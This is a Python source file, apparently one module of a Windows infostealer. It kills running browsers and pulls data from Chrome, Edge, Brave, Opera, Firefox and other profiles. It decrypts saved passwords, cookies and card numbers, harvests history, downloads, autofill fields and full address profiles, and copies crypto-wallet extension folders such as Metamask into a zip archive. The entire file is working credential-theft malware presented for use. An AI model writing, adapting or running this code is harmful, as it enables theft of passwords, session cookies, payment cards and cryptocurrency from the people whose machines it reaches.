# language: Python 3, file: browser_steal.py, target: Windows 10/11
# Browser stealer con autofill table + DPAPI unificado (dpapi.py)
# cubre: passwords, cookies, history, downloads, cards, autofill, extensions

import os, json, sqlite3, psutil
from dpapi import decrypt_browser_value, get_master_key

number_extensions = 0
number_passwords  = 0
number_cookies    = 0
number_history    = 0
number_downloads  = 0
number_cards      = 0
number_autofill   = 0

LOCAL   = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

BROWSER_FILES = [
    ("Google Chrome",          os.path.join(LOCAL,   "Google", "Chrome", "User Data"),                  "chrome.exe"),
    ("Google Chrome SxS",      os.path.join(LOCAL,   "Google", "Chrome SxS", "User Data"),              "chrome.exe"),
    ("Google Chrome Beta",     os.path.join(LOCAL,   "Google", "Chrome Beta", "User Data"),             "chrome.exe"),
    ("Google Chrome Dev",      os.path.join(LOCAL,   "Google", "Chrome Dev", "User Data"),              "chrome.exe"),
    ("Google Chrome Canary",   os.path.join(LOCAL,   "Google", "Chrome Canary", "User Data"),           "chrome.exe"),
    ("Microsoft Edge",         os.path.join(LOCAL,   "Microsoft", "Edge", "User Data"),                 "msedge.exe"),
    ("Brave",                  os.path.join(LOCAL,   "BraveSoftware", "Brave-Browser", "User Data"),    "brave.exe"),
    ("Opera",                  os.path.join(ROAMING, "Opera Software", "Opera Stable"),                 "opera.exe"),
    ("Opera GX",               os.path.join(ROAMING, "Opera Software", "Opera GX Stable"),              "opera.exe"),
    ("Vivaldi",                os.path.join(LOCAL,   "Vivaldi", "User Data"),                           "vivaldi.exe"),
    ("Yandex",                 os.path.join(LOCAL,   "Yandex", "YandexBrowser", "User Data"),           "yandex.exe"),
    ("Amigo",                  os.path.join(LOCAL,   "Amigo", "User Data"),                             "amigo.exe"),
    ("Torch",                  os.path.join(LOCAL,   "Torch", "User Data"),                             "torch.exe"),
    ("Kometa",                 os.path.join(LOCAL,   "Kometa", "User Data"),                            "kometa.exe"),
    ("Orbitum",                os.path.join(LOCAL,   "Orbitum", "User Data"),                           "orbitum.exe"),
    ("Cent Browser",           os.path.join(LOCAL,   "CentBrowser", "User Data"),                       "centbrowser.exe"),
    ("Epic Privacy Browser",   os.path.join(LOCAL,   "Epic Privacy Browser", "User Data"),              "epic.exe"),
    ("Uran",                   os.path.join(LOCAL,   "uCozMedia", "Uran", "User Data"),                 "uran.exe"),
    ("Iridium",                os.path.join(LOCAL,   "Iridium", "User Data"),                           "iridium.exe"),
    ("Mozilla Firefox",        os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"),                 "firefox.exe"),
]

PROFILES = ['', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

EXTENSIONS_NAMES = [
    ("Metamask",      "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    ("Metamask",      "ejbalbakoplchlghecdalmeeeajnimhm"),
    ("Phantom",       "bfnaelmomeimhjnjophhpkkoljpa"),
    ("Coinbase",      "hnfanknocfeofbddgcijnmhnfnkdnaad"),
    ("Binance",       "fhbohimaelbohpjbbldcngcnapndodjp"),
    ("Trust",         "egjidjbpglichdcondbcbdnbeeppgdph"),
    ("Exodus Web3",   "aholpfdialjgjfhomihkjbmgjidlcdno"),
    ("Ronin",         "fnjhmkhhmkbjkkabndcnnogagogbneec"),
    ("Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"),
    ("Yoroi",         "ffnbelfdoeiohenkjibnmadjiehjhajb"),
    ("Kaikas",        "jblndlipeogpafnldhgmapagcccfchpi"),
    ("Math Wallet",   "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
    ("Coin98",        "aeachknmefphepccionboohckonoeemg"),
    ("TerraStation",  "aiifbnbfobpmeekipheeijimdpnlpgpp"),
    ("Guarda",        "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
    ("XDEFI",         "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
    ("Nami",          "lpfcbjknijpeeillifnkikgncikgfhdo"),
    ("Wombat",        "amkmjjmmflddogmhpjloimipbofnfjih"),
]


def _mem_db(path: str):
    """Copia DB a memoria para evitar lock de browser."""
    conn_mem = sqlite3.connect(":memory:")
    disk = sqlite3.connect(path)
    disk.backup(conn_mem)
    disk.close()
    return conn_mem


def _get_passwords(browser, profile_path, master_key, buf):
    global number_passwords
    db = os.path.join(profile_path, 'Login Data')
    if not os.path.exists(db):
        return
    try:
        conn = _mem_db(db)
        cur  = conn.cursor()
        cur.execute('SELECT action_url, username_value, password_value FROM logins')
        for url, user, enc_pass in cur.fetchall():
            if not url or not user or not enc_pass:
                continue
            pwd = decrypt_browser_value(enc_pass, master_key) or "[decrypt failed]"
            buf.append(f"- Url      : {url}\n  Username : {user}\n  Password : {pwd}\n  Browser  : {browser}\n")
            number_passwords += 1
        conn.close()
    except Exception:
        pass


def _get_cookies(browser, profile_path, master_key, buf):
    global number_cookies
    db = os.path.join(profile_path, 'Network', 'Cookies')
    if not os.path.exists(db):
        return
    try:
        conn = _mem_db(db)
        cur  = conn.cursor()
        cur.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
        for host, name, cpath, enc_val, expire in cur.fetchall():
            if not host or not name or not enc_val:
                continue
            val = decrypt_browser_value(enc_val, master_key) or "[decrypt failed]"
            buf.append(f"- Host    : {host}\n  Name    : {name}\n  Path    : {cpath}\n  Value   : {val}\n  Expire  : {expire}\n  Browser : {browser}\n")
            number_cookies += 1
        conn.close()
    except Exception:
        pass


def _get_history(browser, profile_path, buf):
    global number_history
    db = os.path.join(profile_path, 'History')
    if not os.path.exists(db):
        return
    try:
        conn = _mem_db(db)
        cur  = conn.cursor()
        cur.execute('SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500')
        for url, title, t in cur.fetchall():
            if not url:
                continue
            buf.append(f"- Url     : {url}\n  Title   : {title}\n  Time    : {t}\n  Browser : {browser}\n")
            number_history += 1
        conn.close()
    except Exception:
        pass


def _get_downloads(browser, profile_path, buf):
    global number_downloads
    db = os.path.join(profile_path, 'History')
    if not os.path.exists(db):
        return
    try:
        conn = _mem_db(db)
        cur  = conn.cursor()
        cur.execute('SELECT tab_url, target_path FROM downloads')
        for url, path in cur.fetchall():
            if not url or not path:
                continue
            buf.append(f"- Path    : {path}\n  Url     : {url}\n  Browser : {browser}\n")
            number_downloads += 1
        conn.close()
    except Exception:
        pass


def _get_cards(browser, profile_path, master_key, buf):
    global number_cards
    db = os.path.join(profile_path, 'Web Data')
    if not os.path.exists(db):
        return
    try:
        conn = _mem_db(db)
        cur  = conn.cursor()
        cur.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for name, exp_m, exp_y, enc_num, date_mod in cur.fetchall():
            if not name or not enc_num:
                continue
            card_num = decrypt_browser_value(enc_num, master_key) or "[decrypt failed]"
            buf.append(f"- Name     : {name}\n  Exp Mo   : {exp_m}\n  Exp Yr   : {exp_y}\n  Number   : {card_num}\n  Modified : {date_mod}\n  Browser  : {browser}\n")
            number_cards += 1
        conn.close()
    except Exception:
        pass


def _get_autofill(browser, profile_path, buf):
    """
    Tabla autofill de Web Data — nombre y valor de campos guardados.
    Captura formularios: nombres, direcciones, teléfonos, emails.
    """
    global number_autofill
    db = os.path.join(profile_path, 'Web Data')
    if not os.path.exists(db):
        return
    try:
        conn = _mem_db(db)
        cur  = conn.cursor()
        cur.execute('SELECT name, value, count, date_last_used FROM autofill ORDER BY count DESC LIMIT 200')
        for name, value, count, date_last in cur.fetchall():
            if not name or not value:
                continue
            buf.append(f"- Field   : {name}\n  Value   : {value}\n  Count   : {count}\n  Last    : {date_last}\n  Browser : {browser}\n")
            number_autofill += 1
        # también autofill_profile — direcciones completas
        try:
            cur.execute('SELECT full_name, email, phone_number, street_address, city, state, zipcode, country_code FROM autofill_profiles LIMIT 50')
            for row in cur.fetchall():
                full_name, email, phone, street, city, state, zipcode, country = row
                if not any([full_name, email, phone, street]):
                    continue
                buf.append(
                    f"- [Profile] {full_name} | {email} | {phone}\n"
                    f"  Address : {street}, {city}, {state} {zipcode}, {country}\n"
                    f"  Browser : {browser}\n"
                )
                number_autofill += 1
        except Exception:
            pass
        conn.close()
    except Exception:
        pass


def _get_extensions(zip_file, browser, profile_path):
    global number_extensions
    ext_path = os.path.join(profile_path, 'Extensions')
    if not os.path.exists(ext_path):
        return
    for ext_id in os.listdir(ext_path):
        if ext_id == 'Temp':
            continue
        number_extensions += 1
        label = next((name for name, eid in EXTENSIONS_NAMES if eid == ext_id), "Unknown Extension")
        src   = os.path.join(ext_path, ext_id)
        dst   = os.path.join("Extensions", browser, label, ext_id)
        for dirpath, _, files in os.walk(src):
            for fname in files:
                fpath   = os.path.join(dirpath, fname)
                arcname = os.path.relpath(fpath, src)
                try:
                    zip_file.write(fpath, os.path.join(dst, arcname))
                except Exception:
                    pass


def BrowserSteal(zip_file):
    global number_extensions, number_passwords, number_cookies, number_history
    global number_downloads, number_cards, number_autofill
    number_extensions = number_passwords = number_cookies = number_history = 0
    number_downloads  = number_cards     = number_autofill = 0

    browsers_found = []

    # terminar browsers para liberar locks
    procs = {p[2] for p in BROWSER_FILES}
    for proc in psutil.process_iter(['name']):
        try:
            if proc.name().lower() in procs:
                proc.terminate()
        except Exception:
            pass

    buf_pwd    = []
    buf_cook   = []
    buf_hist   = []
    buf_dl     = []
    buf_cards  = []
    buf_auto   = []

    for name, path, _ in BROWSER_FILES:
        if not os.path.exists(path):
            continue

        master_key = get_master_key(path)  # ABE-aware desde dpapi.py
        if not master_key:
            continue

        for profile in PROFILES:
            profile_path = os.path.join(path, profile)
            if not os.path.exists(profile_path):
                continue

            _get_extensions(zip_file, name, profile_path)
            _get_passwords (name, profile_path, master_key, buf_pwd)
            _get_cookies   (name, profile_path, master_key, buf_cook)
            _get_history   (name, profile_path, buf_hist)
            _get_downloads (name, profile_path, buf_dl)
            _get_cards     (name, profile_path, master_key, buf_cards)
            _get_autofill  (name, profile_path, buf_auto)

        if name not in browsers_found:
            browsers_found.append(name)

    def _join(lst, fallback):
        return "\n".join(lst) if lst else fallback

    zip_file.writestr(f"Passwords ({number_passwords}).txt",      _join(buf_pwd,   "No passwords found."))
    zip_file.writestr(f"Cookies ({number_cookies}).txt",          _join(buf_cook,  "No cookies found."))
    zip_file.writestr(f"Browsing History ({number_history}).txt", _join(buf_hist,  "No history found."))
    zip_file.writestr(f"Downloads ({number_downloads}).txt",      _join(buf_dl,    "No downloads found."))
    zip_file.writestr(f"Cards ({number_cards}).txt",              _join(buf_cards, "No cards found."))
    zip_file.writestr(f"Autofill ({number_autofill}).txt",        _join(buf_auto,  "No autofill data found."))

    return number_extensions, number_passwords, number_cookies, number_history, number_downloads, number_cards, number_autofill
